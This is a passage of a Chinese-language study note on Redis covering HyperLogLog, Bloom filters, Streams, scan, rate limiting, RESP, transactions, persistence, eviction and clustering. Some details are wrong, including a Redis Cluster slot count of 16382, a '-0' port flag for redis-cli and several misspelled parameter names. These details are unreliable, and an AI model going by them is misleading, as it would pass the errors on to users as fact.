的内存空间。\nHyperLogLog提供了不精确的去重计数方案，标准误差是0.81%，这样的精确度可以满足UV统计需求。\nHyperLogLog之所以内存消耗如此之小，是因为HyperLogLog的存储算法具备这一特点：\n\n当计数比较小时，它的存储空间采用稀疏矩阵存储。\n计数值增大到稀疏矩阵占用空间超过阈值后，才会一次性转变为稠密矩阵，占用12KB。\n\nHyperLogLog提供的命令有：pfadd、pfcount、pfmerge\npfadd用来添加数据，pfcount用来获取计数值，pfmerge用来合并HyperLogLog\n补充：\nUV（Unique Visitor）数据指的是网站或应用程序的独立访问者数量。UV数据用于衡量网站或应用程序的受众规模和用户活跃度。UV数据通常基于用户的唯一标识符（如用户ID、Cookie、设备ID等）进行统计，以便区分不同的访问者。它可以帮助网站或应用程序的管理者了解其用户群体的规模、用户活跃度、用户留存率等重要指标，从而做出相应的优化和决策。\nPV（Page View）数据指的是网站或应用程序的页面访问次数。PV数据记录了每个页面被访问的次数，无论是同一个用户多次访问同一个页面，还是不同用户访问同一个页面，每一次访问都计算为一次PV。PV数据可以帮助评估网站或应用程序的流量、页面热度以及用户行为。\n布隆过滤器虽然HyperLogLog数据结构能够对数据进行去重计数，但是不能用来判断数据是否已存在。布隆过滤器（Bloom Filter）就是专门用来解决这种问题的，用来判断对象是否存在，相比set能够节省90%的空间，唯一不足是不精确，有一定的误判概率。\n布隆过滤器判断结果的真实性的规则是：\n\n如果布隆过滤器输出某个值存在，这个值可能不存在\n如果布隆过滤器输出某个值不存在，这个值一定不存在\n\n布隆过滤器提供两条命令：bf.add（一次添加一个元素）、bf.madd（一次添加多个元素）、bf.exists\nRedis的布隆过滤器是从Redis4.0开始以插件的形式添加到Redis中的，要使用Redis的布隆过滤器，需要安装对应插件。在使用时，布隆过滤器的initial_size（预计放入的元素数量）参数越大，error_rate（误判率）越小。\n布隆过滤器的原理：\n布隆过滤器底层的数据结构是一个大型的位数组，添加key时，使用几个不同的无偏hash函数，对添加到布隆过滤器的key进行hash，分别算出索引值，然后将索引值位置的值置为1。判断key是否存在时，对添加到布隆过滤器的key进行hash，分别算出索引值，然后看位数组中这几个位的值是否都是1，如果都是1，说明极有可能存在，如果不都是1，说明一定不存在。\n所谓无偏就是能够把元素的hash值算得比较均匀，让key被hash映射到位数组中的位值比较随机。\n布隆过滤器的空间占用估计：\n计算布隆过滤器的空间占用估计需要两个参数，预计元素的数量（设为N）和错误率（设为F），可以得到两个输出，位数组的长度（设为L）和hash函数的最佳数量（设为K）：\nK &#x3D; 0.7 * (L &#x2F; N)\nF &#x3D; 0.6185 ^ (L &#x2F; N)\nK和（L&#x2F;N）成正比，F和（L&#x2F;N）成反比。\n在线计算布隆过滤器计算器：https://krisives.github.io/bloom-calculator\n\n当实际元素数量超过设置的预计元素的数量：\n当实际元素数量超过设置的预计元素的数量，错误率会有陡峭的增大，设实际元素数量和设置的预计元素的数量比值为T，使用的hash函数的数量是K，错误率（设为F）的计算公式是：\nF &#x3D; (1 - 0.5^T) ^ K;\n布隆过滤器的其它应用：\n\n在爬虫系统中对URL进行去重。\n在NoSQL数据库中通过内存中的布隆过滤器过滤掉不存在的row的请求。\n邮箱系统的垃圾邮件过滤。\n\nGeoHashRedis在3.2版本后增加了处理地理位置信息的模块Geo（底层使用的是zset），可以用于实现“附近的单车”、“附近的餐馆”这样的需要对地理位置距离进行排序的功能，在Redis中，是基于GeoHash算法实现的。\nGeoHash算法将二维的经纬度数据映射到一维的整数（使用二刀法等刀法实现），要寻找附近的XXX时只需要找一维下的附近的点。计算后的地图元素的坐标都会变为整数，通过这个整数可以还原出元素的坐标，整数越长，还原出来的坐标值的损失程度就越小。GeoHash算法会对这个整数做一次Base32编码。\nBase32 是一种数据编码机制，使用 32 个可打印字符（字母 A-Z 和数字 2-7）对任意字节数据进行编码的方案。Base32 将任意字符串按照字节进行切分，并将每个字节对应的二进制值（不足 8 比特高位补 0）串联起来，按照 5 比特一组进行切分，并将每组二进制值转换成十进制来对应 32 个可打印字符中的一个。由于数据的二进制传输是按照 8 比特一组进行（即一个字节），因此 Base32 按 5 比特切分的二进制数据必须是 40 比特的倍数（5 和 8 的最小公倍数）。不足 40 比特的倍数则通过填充符号“&#x3D;”来补齐。\n支持的命令有：geoadd、geodist、geopos、georadiusbymember、georadius\n\ngeodist：获取两个元素之间的距离\ngeopos：获取集合中任意元素的经纬度坐标\ngeoradiusbymember：查询元素附近的其它元素\ngeoradius：查找经纬度坐标附近的其它元素\n\nStreamRedis Stream是Redis 5.0版本中新增的数据结构，是一个支持多播的可持久化的消息队列。\nStream的消息有定长的功能，在 xadd 的指令中提供了一定长长度参数 maxlen，就可以实现清除旧有超长的消息。\n消费组每个Stream都可以挂载多个消费组（Consumer Group），每个消费组会有一个游标（last_delivered_id），用于表示当前消费组以及消费到哪条消息。\n消费组之间是独立的\n一个消费组可以挂载多个消费者，任意一个消费者读取了消息都会使游标向前移动。\n创建消费组消费组不会自动创建，创建消费组的命令是xgroup create，创建消费组需要提供起始消息 ID 参数用来初始化 last_delivered_id 变量。\n独立消费可以不定义消费组，将 Stream 当成普通的消息队列（list）来使用。\n消息消息ID消息 ID 的形式是 TimestampInMillis-sequence，例如 1527846880572-5，它表示当前的消息再毫秒时间戳 1527846880572 时产生，并且是该毫秒内产生的第 5 条消息。消息 ID 可以由服务器自动生成，也可以由客户端自己指定，但是形式必须是 “整数-整数”，而且后面加入的消息的 ID 必须要大于前面的消息 ID。\n消息内容消息内容的形式的键值对。\n消息操作1）xadd：向 Stream 追加消息。\n2）xdel：向 Stream 中删除消息，这里的删除仅仅是设置标志位，不影响消息总长度。\n3）xrange：获取 Stream 中的消息列表，会自动过滤已经删除的消息。\n4）xlen：获取 Stream 消息长度。\n5）del：删除整个 Stream 消息列表的所有消息。\n消费者消费消息消费者使用XREAD或XREADGROUP GROUP命令从Redis Stream中读取消息。\n使用 XREAD 以阻塞或非阻塞方式获取消息列表 ，语法格式：\nXREAD [COUNT count] [BLOCK milliseconds] STREAMS key [key ...] id [id ...]\n\n\ncount ：数量\nmilliseconds ：可选，阻塞毫秒数，没有设置就是非阻塞模式\nkey ：队列名\nid ：消息 ID\n\n示例：\n# 从 Stream 头部读取两条消息XREAD COUNT 2 STREAMS mystream writers 0-0 0-0\n\n使用 XREADGROUP GROUP 读取消费组中的消息，语法格式：\nXREADGROUP GROUP group consumer [COUNT count] [BLOCK milliseconds] [NOACK] STREAMS key [key ...] ID [ID ...]\n\n\ngroup ：消费组名\nconsumer ：消费者名。\ncount ： 读取数量。\nmilliseconds ： 阻塞毫秒数。\nkey ： 队列名。\nID ： 消息 ID。\n\n示例：\nXREADGROUP GROUP consumer-group-name consumer-name COUNT 1 STREAMS mystream &gt;\n\n消息 ID可以指定读取的起始位置，如0表示从最早的消息开始读取，或者使用特殊符号&gt;表示从当前最新的消息开始读取。\n处理完消息后，消费者需要使用XACK命令确认消息的处理完成。\npending_ids每个消费者中维持一个状态变量pending_ids，简称为PEL(Pending Entries List)，记录了当前已经被客户端读取的但尚未被ACK的消息。\nRedis操作命令scanscan是一个Redis命令，用于从海量的key中找出满足特定前缀的key列表。相比Redis之前提供的keys命令（也可以完成这一功能）scan具备以下特点：\n\n虽然复杂度也是O(n)，但它是通过游标分步进行的，不会阻塞线程\n提供了limit参数，可以控制服务器单次遍历的最大条数\n返回的结果可能有重复（key存储在hash中，hash缩容时会重复遍历正在遍历的槽），需要客户端去重\n\nscan指令返回的游标就是第一维数组的位置索引（槽，slot），limit参数就表示需要遍历的槽位数\nscan的遍历顺序是高进位加法，高进位加法从左边加，进位往右边移动。\n对于rehash中的字典，scan会同时访问新旧两个数据结构\n除了有可以遍历key的scan指令外，还有针对其它容器集合的遍历操作：\n\nsscan：遍历set集合\nzscan：遍历zset集合\nhscan：遍历hash字典中的元素\n\nscan还可以用来查找大key，方法是对于每个扫描出来的key，使用type指令获得key的类型，然后使用相应数据结构的size或len方法来得到value的大小，对于每一种类型，将大小排名的前若干名作为扫描结果输出。要编写上面过程的脚本比较繁琐，不过Redis官方已经在redis-cli指令中提供了这样的扫描功能。\n示例如下：\nredis-cli -h 127.0.0.1 -0 6379 --bigkeys\n\n还可以指定睡眠时间：\nredis-cli -h 127.0.0.1 -0 6379 --bigkeys -i 0.1\n\n上面这条指令可以实现每个100条scan指令就会休眠0.1s\n补充：\n大key：指的是key对应的value值大，在实际业务中要尽量避免大key的产生，原因是大key会带来如下坏处：\n\n请求阻塞：redis为单线程，读、写或删除大key需要较长的处理时间，会阻塞后续的请求处理。\n网络阻塞：大key会明显需要更长的传输时间，在整个传输时间内，占用大量的带宽，导致网络阻塞。\n占用内存：大 key 在 Redis 内部通常会占用较多的内存空间，导致 Redis 的整体内存使用率变高，可能会引起内存溢出等问题。\n\nRedis的应用分布式锁Redis可以用作分布式锁。\n需要注意的点有：获取锁和设置超时时间需要是组合在一起的原子操作。\n可重入性的一个实现方案是使用线程的ThreadLocal变量存储当前持有锁的计数\n请求阻塞等待的一个实现方案是使用延时队列\n延时队列（zset做异步消息队列）对于消费者数量较少等简单的使用情景，可以使用Redis创建消息队列，简化操作，但是需要注意的是，Redis不是专业的消息中间件，没有非常多的高级特性，没有ack保证，如果对消息的可靠性要求较高，那就不适合使用Redis。\nRedis用来做异步消息队列的数据结构通常是list。当队列为空，消费者还是会不断地通过pop操作尝试获取数据，进行空轮询，浪费系统资源，解决方法是，让消费者线程进入sleep状态，一段时间比如1秒后再苏醒继续执行。\n但是这会造成系统延迟，更好的解决方案是使用blpop或brpop，前缀b代表的是blocking（阻塞读），阻塞读保证在队列为空的时候，会立即进入休眠状态，一旦数据到来，则立刻醒过来。消息的延迟几乎为0。\n当发生锁竞争时，要实现处理请求的阻塞等待，可以使用zset作为队列（Jedis提供的RedisDelayingQueue的底层就是基于Redis的zset数据结构），将冲突的请求放入队列延后处理。\n简单限流一个简单的限流策略的例子是，在指定时间内限制某个请求只允许发生N次。使用Redis可以实现这一功能。\n实现示例如下：\npublic class RedisLimiter &#123;    private final Jedis jedis;    public RedisLimiter(Jedis jedis) &#123;        this.jedis = jedis;    &#125;        public boolean isActionAllowed(String userId, String action, int period, int maxCount) &#123;        String key = String.format(&quot;hist:%s:%s&quot;, userId, action);        long nowTimeMillis = System.currentTimeMillis();        Pipeline pipeline = jedis.pipelined();        pipeline.zadd(key, nowTimeMillis, String.valueOf(nowTimeMillis)); // 向key中添加member-score，方法的参数是zadd(String key, double score, String member)        pipeline.zremrangeByScore(key, 0, nowTimeMillis - period * 1000L); //删除key里面过期的member-score，只保留最近period * 1000L毫秒内的member-score        Response&lt;Long&gt; count = pipeline.zcard(key);        pipeline.expire(key, period); //设置过期时间        pipeline.close();        pipeline.sync();        Long value = count.get();        //System.out.println(&quot;value = &quot; + value); //如果没有删除缓存，就可能看到value不是从1开始的        return count.get() &lt;= maxCount;    &#125;        public void deleteCache(String userId, String action) &#123;        String key = String.format(&quot;hist:%s:%s&quot;, userId, action);        jedis.del(key);    &#125;    public static void main(String[] args) throws InterruptedException &#123;        Jedis jedis = new Jedis();        RedisLimiter redisLimiter = new RedisLimiter(jedis);        final String USER_ID = &quot;user&quot;;        final String ACTION = &quot;getRequest&quot;;        redisLimiter.deleteCache(USER_ID, ACTION); //删除Redis缓存        for (int i = 0; i &lt; 20; i++) &#123;            Thread.sleep(1); //sleep一毫秒，确保isActionAllowed函数中的nowTimeMillis值每次都不同            System.out.println(redisLimiter.isActionAllowed(USER_ID, ACTION, 60, 5));        &#125;    &#125;&#125;\n\n输出结果如下，只有当缓存中存储的次数不超过maxCount允许的数量（例子中是5），才可以返回true：\n\n漏斗限流（Redis-Cell模块的cl.throttle命令）漏斗（Funnel）限流是最常用的限流算法之一。漏斗的剩余空间代表着行为当前可以进行的数量，漏斗的流水速率代表系统允许该行为的最大频率。要实现这一算法需要存储几个参数，比如漏斗容量、流水速率、漏斗剩余空间，可以考虑使用Redis的hash数据结构实现，但是存在一个问题，就是无法保证漏斗容量计算时涉及到的取值、运算、写值的三个过程的原子性。\nRedis-Cell模块提供了漏斗算法的实现，解决了这一问题，该模块的命令只有一个，cl.throttle，该命令的使用格式如下：\ncl.throttle [key] [capacity] [velocity] [apply 1 operation](/2023/05/06/Redis/../optional)\n\n\nkey：键\ncapacity：漏斗容量\nvelocity：流水速率\napply 1 operation：添加一个数，是可选的。\n\n示例：\ncl.throttle 1001 15 30 60 1\n\n输出如下：\n1)(Integer) 0        # 0表示允许，1表示拒绝\n2)(Integer) 15      # 漏斗容量是15\n3)(Integer) 14      # 漏斗剩余空间是14\n4)(Integer) -1       # 如果被拒绝了，多长时间后重试\n5)(Integer) 2         # 多长时间后漏斗完全空出来\n数据传输与网络Redis的特点\n是单线程程序。除Redis外，Node.js和Nginx也都是单线程。\n数据存储在内存中\nI&#x2F;O多路复用，是Redis能够处理大量客户端连接的原因\n速度快\n\nRedis 速度快的原因主要包括以下几点：\n\n内存存储：Redis 将数据存放在内存中，而不是硬盘上。因为内存访问速度比硬盘快得多，所以 Redis 能够达到非常快的读写速度，这也是 Redis 被称为高性能数据库的重要原因之一。\n单线程模型：Redis 使用单线程模型，即使用一个线程来处理所有的客户端请求，这使得 Redis 可以避免锁竞争、多线程切换等问题，从而提高了效率。\n高效的网络 IO 模型：Redis 使用 I&#x2F;O 多路复用技术来实现高效的网络 IO 模型，这种模型可以同时管理多个客户端连接，并且每个连接都只被唤醒一次，从而减少了系统调用次数，提高了效率。\n高效的数据结构：Redis 支持多种数据结构，如字符串、哈希表、列表、集合、有序集合等，这些数据结构经过优化和精简，能够快速地进行插入、删除、查询等操作，从而提高了性能。比如rehash就是优化的一个例子。\n高效的持久化和异步处理机制：Redis 提供了 RDB 和 AOF 两种持久化方案，通过定期或追加记录将内存中的数据同步到硬盘。同时 Redis 还具有异步处理机制，可以延迟一部分 I&#x2F;O 操作，让 CPU 可以在更多的时间内执行其他操作，从而提高了系统的整体效率。\n\nI&#x2F;O线程模型同步与异步同步指的是在发出一个功能调用时，在没有得到结果之前，该调用就不返回。也就是必须一件一件事做，等前一件做完了才能做下一件事。\n异步的概念和同步相对，当一个异步过程调用发出后，调用者不需要立刻得到结果。调用被执行完成后，会通知调用者。\n5种主要的IO模型\n阻塞IO模型\n当我们调用套接字的读写放方法，默认是阻塞的，read操作是在没有读取到字节时线程阻塞，write操作是在写缓冲区已满时阻塞。\n典型应用：BIO（Blocking I&#x2F;O）\n\n非阻塞IO模型\n非阻塞IO在套接字对象上设置了non_blocking，读写方法不会阻塞，会反复地发起读&#x2F;写请求，对于read操作，当内核准备好数据之后就进行读，对于写操作，当写缓冲区的有空闲空间就进行写。\n典型应用：Java NIO（Non-blocking I&#x2F;O，New I&#x2F;O）\n\n多路复用IO模型\n一种简单的多路复用API是select，多个的进程的IO注册到一个复用器（select）上，然后用一个进程调用该select，select会监听所有注册进来的IO。\n如果select没有监听的IO在内核缓冲区都没有可读数据，select调用进程会被阻塞；而当任一IO在内核缓冲区中有可数据时，select调用就会返回；\n典型应用：epoll（linux系统的性能最好的多路复用API）。\n\n异步IO模型\n当进程发起一个IO操作，进程返回（不阻塞），但也不能返回果结；内核把整个IO处理完后，会通知进程结果。如果IO操作成功则进程直接获取到数据。\n典型应用：Java AIO（Asynchronous I&#x2F;O）\n\n信号驱动IO模型\n当进程发起一个IO操作，会向内核注册一个信号处理函数，然后进程返回不阻塞；当内核数据就绪时会发送一个信号给进程，进程便在信号处理函数中调用IO读取数据。\n\n\nRedis序列化协议（RESP）RESP是Redis序列化协议（Redis Serialization Protocal）的简写，是一种直观的文本协议。\nRESP将传输的数据分为5种最小单元类型，单元结束时统一加上回车换行符号\\r\\n。规则如下：\nIn RESP, the first byte determines the data type:\n\nFor Simple Strings, the first byte of the reply is “+”\nFor Errors, the first byte of the reply is “-“\nFor Integers, the first byte of the reply is “:”\nFor Bulk Strings, the first byte of the reply is “$”. A “$” byte followed by the number of bytes composing the string (a prefixed length), terminated by CRLF.\nFor Arrays, the first byte of the reply is “*“\n\nNULL用多行字符串表示，不过长度要写成-1：\n$-1\\r\\n\n\n客户端向服务端发送的指令只有一种格式，多行字符串数组。比如指令set author codehole会被序列化为下面的字符串：\n*3\\r\\n$3\\r\\nset\\r\\n$6\\r\\nauthor\\r\\n$8\\r\\ncodehole\\r\\n\n\n服务端向客户端返回的数据结构有的比较复杂，不过也是以上五种基本类型的组合。例如scan命令的返回给客户端的结果，scan命令返回的是一个嵌套数组，数组的第一个值表示游标的值，如果这个值为零，说明已经遍历完毕。scan返回结果示例：\n*2\\r\\n$1\\r\\n0\\r\\n*3\\r\\n$4\\r\\ninfo\\r\\n$5\\r\\nbooks\\r\\n$6author\\r\\n\n\n里面嵌套了一个数组\n*3\\r\\n$4\\r\\ninfo\\r\\n$5\\r\\nbooks\\r\\n$6author\\r\\n\n\n虽然RESP协议里面有大量冗余的回车换行符，但是依然是非常受欢迎的一个文本协议。\n管道Redis的管道（Pipeline）不是由Redis服务器提供的技术，而是由客户端提供的。\nRedis管道通过将多个命令打包在一起，然后一次性发送给Redis服务器，在一次通信中获得多个命令的执行结果。这样就可以减少通信次数，提高性能。\n使用Redis自带的压力测试工具redis-benchmark,，可以测试出设置不同的单个管道内并行的请求数量所带来的QPS（Queries Per Second，每秒查询率）的改变。\n事务Redis事务的操作指令有multi、exec、discard、watch。分别表示事务的开始、提交、丢弃、监视变量。\n所有指令在exec之前不会执行，而是缓存在服务器的事务队列中。执行完毕后一次性返回所有指令的运行结果。\nRedis的事务不具备原子性，仅仅实现了事务的“串行化”，当前执行的事务不被其它的事务打断。\nRedis的事务通常会结合pipeline一起使用，可以将多次IO操作合并为一次。在Python的Redis客户端，Redis执行事务时要强制使用pipeline。\nwatch\n在 Redis 中，watch命令用来监视某个键，在服务器收到exec命令将要执行缓存的事务队列时，Redis会检查自变量被watch之后是否被改过。如果该键watch之后和exec之前被修改过，exec就会返回 NULL告诉客户端事务执行失败，这个时候客户端一般会选择重试。\n需要注意的是，Redis禁止在multi和exec之间执行watch命令，必须在multi之前watch变量。\n示例（Java语言中使用watch命令）：\npublic class WatchUsage &#123;    public static String keyFor(String userId) &#123;        return String.format(&quot;account_%s&quot;, userId);    &#125;    public static int doubleAccount(Jedis jedis, String userId) &#123;        String key = keyFor(userId);        while (true) &#123;            jedis.watch(key);            int value = Integer.parseInt(jedis.get(key));            value &lt;&lt;= 1; //乘以2            Transaction transaction = jedis.multi();            transaction.set(key, String.valueOf(value));            List&lt;Object&gt; result = transaction.exec();            if (result != null) &#123;                break;            &#125;        &#125;        return Integer.parseInt(jedis.get(key));    &#125;    public static void main(String[] args) &#123;        Jedis jedis = new Jedis();        String userId = &quot;1001&quot;;        String key = keyFor(userId);        jedis.setnx(key, String.valueOf(5));        System.out.println(doubleAccount(jedis, userId));        jedis.close();        /*        输出结果：        \t10        */    &#125;&#125;\n\n\n\n消息多播（PubSub）消息多播允许生产者只生产一次消息，由中间件负责将消息复制到多个消息队列，每个消费队列由对应的消费组进行消费。这是分布式系统常用的一种解耦方式，用于将多个消费组的逻辑进行拆分。\nRedis中支持消息多播的模块是PubSub（PublisherSubscriber，发布者-订阅者模式）\nRedis提供的模式订阅命令是subscribe，Redis还提供了psubscribe命令（pattern subscribe），可以实现通过模式匹配订阅主题。\n命令：\n\nsubscribe：订阅主题\npsubscribe：通过模式匹配订阅主题\nunsubscribe：取消订阅主题\nunpsubscribe：通过模式匹配取消订阅主题\n\nPubSub的缺点：\n\n当生产者发送消息时，如果消费者下线没有收到消息，那么该消息对于该消费者来说就是彻底丢失了\n\n正式因为PubSub有这个缺点，在消息队列的领域几乎找不到合适的应用场景。Redis5.0新增了Stream数据结构，给Redis带来了持久化的消息队列，从此PubSub退出作为消息队列的技术方案选项。\n持久化RDB日志（内存快照）RDB（Redis DataBase）日志（内存快照）是内存数据的二进制序列化，是全量备份。\n内存快照要求Redis必须进行文件IO操作，而Redis是单线程程序，如果一边处理业务请求，一边进行文件IO操作，会降低处理业务请求的性能，还有个问题是，这种操作下，内存数据一边被持久化一边被修改，快照就不是对一个时间点的记录，而是成了多个时间点交错的记录，无法使用。\nRedis使用操作系统多进程COW（Copy On Write）机制来实现快照持久化。\nCopy-On-Write（COW）是一种操作系统中常用的技术，其基本思想是：当多个进程需要访问同一块内存地址时，操作系统会将这块内存标识为只读，并且在任何进程试图写入该内存前，都会复制一份副本供该进程使用。这样就能够保证每个进程都拥有自己的独立内存空间，而不会互相干扰。\nAOF日志AOF（Append Only File）日志是内存数据修改的指令记录文本，是增量备份。\nRedis收到客户端的修改命令后，进行参数校验、逻辑处理，如果没问题，就将该指令文本存储到AOF日志中，即先执行指令再将存储日志。\nAOF日志在长期的运行过程中会变得十分庞大，数据库重启时需要加载AOF日志进行指令重放，这个过程就会很漫长，所以需要定期进行AOF重写，给AOF日志进行瘦身。\nRedis提供了bgrewriteaof命令用于对AOF日志进行瘦身，其原理是开辟一个子进程对内存进行遍历，转换成一系列Redis的操作命令，序列化到一个新的AOF日志文件中，序列化完成后再将操作期间发生的增量AOF日志追加到这个新的AOF日志文件中，追加完毕后就可以替代旧的AOF日志文件了。\n当程序对AOF日志文件进行写操作时，实际上是将内容写到了以内核为文件描述符分配的一个内存缓存中，然后内核会异步地将脏数据刷回到磁盘。这就意味着，如果突然宕机，AOF日志还没有完全刷新到磁盘中，就会出现日志丢失。Linux的glibc提供的fsync(int fd)函数可以将指定文件的内容强制从内核缓存刷新到磁盘，只要Redis进行实时调用fsync函数就可以保证AOF日志不丢失。但是fsync是一个磁盘IO操作，很慢，如果Redis执行一条指令就要fsync一次，那么会严重降低Redis的性能。所以在生产环境的服务器中，Redis通常是每隔1s左右执行一次fsync操作，这个1s的周期是可以配置的，是在安全性和性能间做的折中。\n因为RDB和AOF都会加重系统的负担，所以通常Redis的主节点不会进行持久化操作，持久化操作主要在从节点进行，这是因为从节点没有来自客户端请求的压力，系统资源充足。\n混合持久化使用RDB恢复内存状态会丢失备份后修改的数据，而使用AOF日志的全量文件重放又相对RDB慢很多，Redis为解决这个问题，从Redis4.0开始，引入了一个新的持久化选项，混合持久化。\n混合持久化的持久化方式是指生成RDB全量日志和该RDB的AOF增量日志，在Redis重启的时候，先加载RDB日志，再加载AOF日志。\n内存管理内存回收机制被删除的key分散在很多页面中，这个页面可能还有其它正在使用的key，操作系统是以页为单位进行内存回收的，这个页上只要还有一个key在使用，那这个页就不能回收。\nRedis虽然无法保证立即回收已经删除key的内存，但是它会重新使用哪些尚未回收的空闲内存。\n内存分配机制Redis在内存分配方面，直接使用了第三方的内存分配库，目前Redis使用jemalloc（facebook）库来管理内存，也可以切换到tcmalloc（google），因为jemalloc比tcmalloc性能稍好，所以Redis默认使用jemalloc。\n通过info memory可以查看Redis使用的是哪个第三方的内存分配库。\n数据过期机制定时删除EXPIRE命令可以为指定的键设置过期时间，时间到达后，这些建会被自动删除。\nserverCron函数会定时触expire.c下的activeExpireCycle函数，该函数会清除数据库中的过期数据，该函数可以设置最长执行时间和每次删除操作删除的最大的key数量。以避免删除操作延时过长。\n惰性删除惰性删除是当用户查询键时，检测键是否过期，如果键已经过期，则删除该键。该操作由expireIfNeeded函数完成。\n数据淘汰策略Redis支持的数据淘汰策略Redis官方给出的数据淘汰策略（Eviction policies）文档。下面是从官网复制的Redis支持的数据淘汰策略及其解释。\nThe exact behavior Redis follows when the maxmemory limit is reached is configured using the maxmemory-policy configuration directive.\nThe following policies are available:\n\nnoeviction: New values aren’t saved when memory limit is reached. When a database uses replication, this applies to the primary database\nallkeys-lru: Keeps most recently used keys; removes least recently used (LRU) keys\nallkeys-lfu: Keeps frequently used keys; removes least frequently used (LFU) keys\nvolatile-lru: Removes least recently used keys with the expire field set to true.\nvolatile-lfu: Removes least frequently used keys with the expire field set to true.\nallkeys-random: Randomly removes keys to make space for the new data added.\nvolatile-random: Randomly removes keys with expire field set to true.\nvolatile-ttl: Removes keys with expire field set to true and the shortest remaining time-to-live (TTL) value.\n\nLRULRU（Least Recently Used）：如果一个数据在最近一段时间内没有被访问，那么可以认为它未来被访问的概率很小。当空间满时，最久没有访问的数据会最先被淘汰。\nLRU记录的是时间戳。\nRedis的LRU算法是一种近似LRU算法，没有维护key的被访问时间顺序，而是采用随机采样出N个（比如5个，可以设置），然后淘汰掉最旧的key，为能够识别出key的访问时间，Redis给每个key增加了一个额外的字段，最后一次被访问的时间戳。\nLFULFU（Least Frequently Used）：如果一个数据在最近一段时间内很少被访问，那么认为将来它被访问的可能性很小。当空间满时，最小频率访问的数据最先被淘汰。\nLFU记录的是使用次数。\nRedis会根据键的空闲事件对LFU计数进行衰减。\n集群主从同步（主从复制）同步复制：Redis3.0之后增加了wait指令，可以将主从复制由异步改为同步，可以设置需要同步的从节点的数量和最长等待时间（-1表示无限等待）。\n异步复制下的分布式Redis系统不满足CAP理论中的一致性（C，Consistency）。\n即使在主从网络断开的情况下，主从节点依旧可以向外提供服务，所以Redis满足可用性（A，Availability）。\nRedis支持主从同步和从从同步（用以减轻主节点同步的负担）。\n快照（RDB）同步快照同步是在主节点上进行一次bgsave，将当前内存的数据快照存储到磁盘，再将快照文件传输到从节点，从节点接收完毕后，执行全量加载，加载完毕后通知主节点进行增量同步。\n进行快照同步时，文件IO操作十分耗时，且会影响fsync的执行，所以从Redis2.8.18开始支持无盘复制，主服务器通过套接字直接将快照内容发送给从节点，从节点将接收到的内容存储到硬盘文件。\n增量（AOF）同步Redis增量同步同步的是指令流，主节点会将那些对自己的状态产生修改性影响的指令记录在本地的内存buffer中，然后异步地将buffer中的指令同步到从节点。\nRedis的buffer是一个定长的环形数组，如果数组内容满了，就会从头开始覆盖前面的内容，如果因为网络状况不好等原因没有及时的同步，那么没有同步的指令可能会被后续的指令覆盖，此时就需要使用快照同步。如果进行快照同步的过程中，buffer又发生了覆盖，就会引发又一次的快照同步，所以如果buffer大小设置不当，可能引起快照同步的死循环。\n增加节点当节点添加到集群，会先进行一次快照同步，完成后再继续进行增量同步。\nSentinelRedis提供的Sentinel（哨兵）可以实现集群主节点发生故障后自动进行主从切换。具体作用如下：\n\nSentinel能够持续监控主从节点的在线状况。\n\n客户端连接集群时，会首先连接Sentinel，通过Sentinel查询主节点的地址，当主节点发生故障时，Sentinel会将最新的主节点地址告诉客户端。\n\nSentinel无法保证主从同步因为异步而在主节点下线后产生消息丢失，但是会采取措施限制主从延迟，方式是设置参数min-slaves-to-write和min-slaves-max-tag，第一个参数表示主节点至少有多少个从节点正在进行正常复制，如果不够，就停止写服务。正常复制是含义是由第二个参数控制的，它的单位是秒，表示如果在多少秒内没有收到从节点的反馈，就意味着从节点的同步不正常。\n\n主从切换后，为使客户端“知道”地址变更了，Sentinel会关闭所有的客户端连接，在重连时使客户端使用新的地址。\n\n\nRedis集群方案CodisCodis是Redis的集群代理中间件，当客户端向Codis发送指令时，Codis负责将指令转发到后面的Redis实例执行，并将返回结构转回给客户端。Code上挂接的所有Redis实例构成一个Redis集群，当集群空间不足时，可以通过动态增加Redis实例来实现扩容。\n因为单个Codis代理能支撑的QPS有限，可以启动多个Codis代理增加QPS，还可以起到容灾的功能。\nCodis的槽位定位算法：\nCodis将key转发到对应Redis实例的定位机制是通过划分槽位实现的。Codis默认将所有的key划分为1024个槽位（slot），对客户端传入的key进行crc32运算计算hash值，然后用这个hash值对1024取余，这个余数就是key所属的槽位。\n每个槽位都会映射到多个Redis实例。Codis会维护槽位和Redis实例的对应关系。当使用到多个Codis实例，就需要对不同Codis实例的槽位信息进行同步，需要使用一个分布式配置存储库如zookeeper，Codis会监听到槽位信息的变化并同步槽位信息。\nCodis处理Redis扩容：\n当Redis扩容（增加Redis实例）时，会对槽位关系进行调整，并进行自动均衡。\n使用Codis的缺点：\n由于key分散在不同的Redis实例中，所以不再支持事务。\n客户端需要多走一个网络节点（Codis节点）才能到达Redis，性能上比直接访问Redis性能有所下降。\nCodis的优点：\nCodis在设计上比Redis Cluster简单，将分布式配置问题交给了第三方（zookeeper或etcd）负责，省去了编写和维护分布式一致性的工作。而Redis Cluster自己实现了这一点，混合使用了Raft和Gossip协议，有大量需要调优的配置参数，集群出现故障时不容易排查。\nCodis和Redis Cluster的不同\nCodis的默认槽位数是1024，而Redis Cluster的默认槽位数是16382\nCodis是中心化的（需要使用如zookeeper维护配置信息），Redis Cluster是去中心化的（通过Raft和Gossip协议自行维护配置信息）\n客户端访问Codis维护的Redis集群每次都需要经过Codis节点，而客户端访问Redis Cluster维护的Redis集群可以直接根据获取到的配置信息定位到Redis实例\nCodis默认使用crc32算法计算key的hash值，Redis Cluster默认使用的是crc16\n\nRedis Cluster与Codis不同，Redis Cluster是去中心化的，该集群由三个Redis节点组成，每个节点负责整个集群的一部分数据，它们之间使用一种特殊的二进制协议交互集群信息。\nRedis Cluster将所有key划分为16382个槽位，每个节点负责存储其中一部分槽位映射信息。客户端连接集群时会得到一份集群的槽位配置信息，客户端可以直接根据该信息定位到目标节点（Redis实例）。\nRedis Cluster的槽位定位算法：\nRedis Cluster默认对key使用crs16算法进行hash，得到一个整数值，然后对16382取余得到具体的槽位\nRedis Cluster还允许用户强制把指定key挂在特定的槽位上，实现方法是在key字符串上添加tag标记。\nRedis Cluster的槽位纠错机制：\n当客户端向一个错误节点发出了指令，该节点会发现指令的key所在的槽位并不归自己管理，这时它会向客户端发送一个特殊的跳跃指令（MOVED指令）携带目标操作的节点地址，告诉客户端去连接这个节点以获取数据。\nRedis Cluster的数据迁移策略：\nRedis 